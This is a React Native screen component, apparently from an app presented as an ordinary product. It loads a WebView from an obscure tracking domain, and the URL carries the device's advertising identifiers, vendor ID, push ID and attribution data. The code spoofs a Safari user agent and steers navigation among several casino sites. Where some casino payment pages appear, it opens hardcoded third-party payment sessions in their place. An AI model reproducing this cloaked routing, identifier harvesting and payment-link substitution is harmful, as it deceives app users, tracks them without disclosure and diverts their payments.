import React, {useRef, useState, useEffect} from 'react';
import {
  View,
  SafeAreaView,
  TouchableOpacity,
  Alert,
  Linking,
  Image,
  Text,
} from 'react-native';
import {WebView} from 'react-native-webview';
import DeviceInfo from 'react-native-device-info';
import AsyncStorage from '@react-native-async-storage/async-storage';

const QuebecOrigenProdactScreen = ({navigation, route}) => {
  console.log('route==>', route.params);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(
    route.params?.addPartToLinkOnce,
  );
  console.log('addPartToLinkOnce==>', addPartToLinkOnce);
  ////////////////////////////////
  const [oneSignalId, setOneSignalId] = useState(route.params?.oneSignalId);
  const [idfa, setIdfa] = useState(route.params?.idfa);
  const [uid, setUid] = useState(route.params?.uid);
  const [sab, setSab] = useState(route.params?.sab1);
  const [pid, setPid] = useState(route.params?.pid);
  const [adToken, setAdToken] = useState(route.params?.adToken);
  const [adAtribution, setAdAtribution] = useState(route.params?.adAtribution);
  const [adKeywordId, setAdKeywordId] = useState(route.params?.adKeywordId);
  const [idfv, setIdfv] = useState(route.params?.idfv);
  //console.log('idfvInProductScr============================>', idfv);
  const [customerUserId, setCustomerUserId] = useState(
    route.params?.customerUserId,
  );

  /////////////Timestamp + user_id generation
  const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
  //console.log('idForTag', timestamp_user_id);

  const refWebview = useRef(null);

  const customSchemes = [
    'scotiabank',
    'bmoolbb',
    'cibcbanking',
    'conexus',
    'rbcmobile',
    'pcfbanking',
    'tdct',
    'blank',
    'wise',
    'https://app.rastpay.com/payment/',
    'googlepay://',
    'applepay://',
  ];

  //**івент push_subscribe
  useEffect(() => {
    const sendPushSubscribeEvent = async () => {
      const pushSubscribeStatus = await AsyncStorage.getItem(
        'pushSubscribeStatus',
      );

      // Відправляємо івент лише, якщо його ще не відправляли
      if (!pushSubscribeStatus && route.params?.responseToPushPermition) {
        fetch(
          `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=push_subscribe&jthrhg=${timestamp_user_id}`,
        );
        console.log('івент push_subscribe !!!');
        await AsyncStorage.setItem('pushSubscribeStatus', 'sent');
      }
    };

    setTimeout(() => {
      sendPushSubscribeEvent();
    }, 500);
  }, []);

  //**івент webview_open
  useEffect(() => {
    setTimeout(() => {
      fetch(
        `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=webview_open&jthrhg=${timestamp_user_id}`,
      );
      console.log('івент webview_open !!!');
    }, 500);
  }, []);

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [
    idfa,
    uid,
    sab,
    pid,
    adToken,
    adAtribution,
    adKeywordId,
    idfv,
    customerUserId,
  ]);

  const setData = async () => {
    try {
      const data = {
        idfa,
        uid,
        sab,
        pid,
        adToken,
        adAtribution,
        adKeywordId,
        idfv,
        customerUserId,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('QuebecOrigenProdactScreen', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('QuebecOrigenProdactScreen');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('parsedData==>', parsedData);
        setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setIdfa(parsedData.idfa);
        setUid(parsedData.uid);
        setSab(parsedData.sab);
        setPid(parsedData.pid);
        setAdToken(parsedData.adToken);
        setAdAtribution(parsedData.adAtribution);
        setAdKeywordId(parsedData.adKeywordId);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
      } else {
      }
    } catch (e) {
      //console.log('Помилка отримання даних:', e);
    }
  };

  // кастомний юзерагент
  const deviceInfo = {
    deviceBrand: DeviceInfo.getBrand(),
    deviceId: DeviceInfo.getDeviceId(),
    deviceModel: DeviceInfo.getModel(),
    deviceSystemName: DeviceInfo.getSystemName(),
    deviceSystemVersion: DeviceInfo.getSystemVersion(),
  };

  ////////////////////////////
  {
    /***/
  }
  let baseUrl = `https://splendid-magnificent-triumph.space/C4w1RbMZ?C4w1RbMZ=1&advertising_id=${idfa}&uid=${uid}&adAtribution=${adAtribution}&adKeywordId=${adKeywordId}&customer_user_id=${customerUserId}&idfv=${idfv}&onesignal_id=${oneSignalId}`;
  let sabParts = sab ? sab.split('_') : [];
  let additionalParams = sabParts
    .map((part, index) => `sub_id_${index + 1}=${part}`)
    .join('&'); //

  // Перевіряємо, чи в першому елементі саб частин є "Organic"
  let shouldAddAdditionalParams = !(sabParts[0] && sabParts[0] === 'Organic');

  const product =
    `${baseUrl}` +
    (shouldAddAdditionalParams && additionalParams
      ? `&${additionalParams}`
      : '') +
    (pid ? `&pid=${pid}` : '') +
    (!addPartToLinkOnce ? `&yhugh=true` : '');

  console.log('My product Url==>', product);
  //Alert.alert(product);

  //const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
  //const customUserAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0`;

  const userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1`;
  const customUserAgent = `${userAgent} Safari/604.1`;
  //console.log(customUserAgent);

  useEffect(() => {
    WebView.userAgent = customUserAgent;
  }, []);
  ///////////////////////////

  const [redirectUrl, setRedirectUrl] = useState(product);
  const [checkNineUrl, setCheckNineUrl] = useState();
  //console.log('checkNineUrl====>', checkNineUrl);

  const handleShouldStartLoad = event => {
    const {url} = event;
    ////console.log('Should Start Load: ', url);
    return true;
  };

  const handleNavigationStateChange = navState => {
    const {url} = navState;
    //console.log('NavigationState: ', url);
    //console.log('navState: ', navState);
    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
    } else if (url.includes('https://ninecasino')) {
      setCheckNineUrl(product);
    } else if (
      url.includes('https://interac.express-connect.com/cpi?transaction=')
    ) {
      setRedirectUrl(product);
    } else if (url.includes('about:blank') && checkNineUrl === product) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      console.log('xxxx');
    } else if (
      url.includes('https://app.corzapay.com/payment/') &&
      checkNineUrl === product
    ) {
      Linking.openURL(
        `https://payment.paydmeth.com/en/cointy-white/payment/c13f7613-8ae7-48e0-8915-aa8187dd94ed`,
      );
      //refWebview.current.injectJavaScript(
      //  `window.location.href = 'https://payment.paydmeth.com/en/cointy-white/payment/e82e61d0-1d94-4dcd-8b35-6122c69bae1a'`,
      //);
      console.log('WWWWW');
    } else if (
      url.includes('neteller') ||
      url.includes('rapidtransfer') ||
      url.includes('skrill') ||
      (url.includes('paysafecard') && checkNineUrl === product)
    ) {
      //Linking.openURL(url);
      //return false;
      return; // Дозволити навігацію для цих URL-адрес
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const {url} = event;
    //console.log('onShouldStartLoadWithRequest========> ', url);

    if (url.startsWith('mailto:')) {
      Linking.openURL(url);
      return false;
    } else if (url.startsWith('itms-appss://')) {
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('bitcoin') ||
      url.includes('litecoin') ||
      url.includes('dogecoin') ||
      url.includes('tether') ||
      url.includes('ethereum') ||
      url.includes('bitcoincash')
    ) {
      return false;
    } else if (
      url.startsWith('https://m.facebook.com/') ||
      url.startsWith('https://www.facebook.com/') ||
      url.startsWith('https://www.instagram.com/') ||
      url.startsWith('https://twitter.com/') ||
      url.startsWith('https://www.whatsapp.com/') ||
      url.startsWith('https://t.me/') ||
      url.includes('https://web.telegram')
    ) {
      Linking.openURL(url);
      return false;
    } else if (url.includes('pay.skrill.com') && checkNineUrl === product) {
      //console.log('Hello!!!!!!!!!!!!!!!!!!!!!');
      Linking.openURL(url);
      return false;
    } else if (url.includes('applepay://') || url.includes('googlepay://')) {
      // Відкриваємо URL, якщо він веде на Apple Pay або Google Pay
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('app.rastpay.com/payment') &&
      checkNineUrl === product
    ) {
      //console.log('Wise!');
      Linking.openURL(
        `https://openbanking.paysolo.net/session/38174d728a-730e664b72498a6f-GjwWW08AOP`,
      );
      return false;
    } else if (url === 'https://jokabet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://ninecasino.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://bdmbet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://winspirit.app/?identifier=') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('https://rocketplay.com/api/payments')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('secure.livechatinc.com/customer/action/')) {
      //refWebview?.current?.goBack();
      return false;
    } else {
      const scheme = url.split(':')[0];
      if (customSchemes.includes(scheme)) {
        Linking.canOpenURL(url)
          .then(canOpen => {
            if (canOpen) {
              Linking.openURL(url).catch(error => {
                console.warn(`Unable to open URL: ${url}`, error);
              });
            } else {
              Alert.alert(`The ${scheme} app is not installed on your device.`);
            }
          })
          .catch(error => {
            console.warn(`Error checking if URL can be opened: ${url}`, error);
          });
        return false;
      }
    }

    return true;
  };

  //ф-ція для повернення назад
  const goBackBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.goBack();
    }
  };

  //ф-ція для оновлення сторінки
  const reloadPageBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.reload();
    }
  };

  return (
    <SafeAreaView style={{flex: 1, backgroundColor: '#191d24'}}>
      <WebView
        originWhitelist={[
          '*',
          'http://*',
          'https://*',
          'intent://*',
          'tel:*',
          'mailto:*',
        ]}
        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
        onNavigationStateChange={handleNavigationStateChange}
        source={{
          uri: product,
        }}
        textZoom={100}
        allowsBackForwardNavigationGestures={true}
        domStorageEnabled={true}
        javaScriptEnabled={true}
        allowsInlineMediaPlayback={true}
        setSupportMultipleWindows={false}
        mediaPlaybackRequiresUserAction={false}
        allowFileAccess={true}
        javaScriptCanOpenWindowsAutomatically={true}
        style={{flex: 1}}
        ref={refWebview}
        userAgent={customUserAgent}
      />

      <View
        style={{
          flexDirection: 'row',
          justifyContent: 'space-between',
          marginBottom: -20,
          paddingTop: 10,
        }}>
        {/**Btn back */}
        <TouchableOpacity
          style={{marginLeft: 40}}
          onPress={() => {
            goBackBtn();
          }}>
          <Image
            style={{width: 30, height: 33}}
            source={require('../assets/newDiz/arrow77.png')}
          />
        </TouchableOpacity>

        {/**Btn reload */}
        <TouchableOpacity
          style={{marginRight: 40}}
          onPress={() => {
            reloadPageBtn();
          }}>
          <Image
            style={{width: 30, height: 30}}
            source={require('../assets/newDiz/redo77.png')}
          />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
};

export default QuebecOrigenProdactScreen;
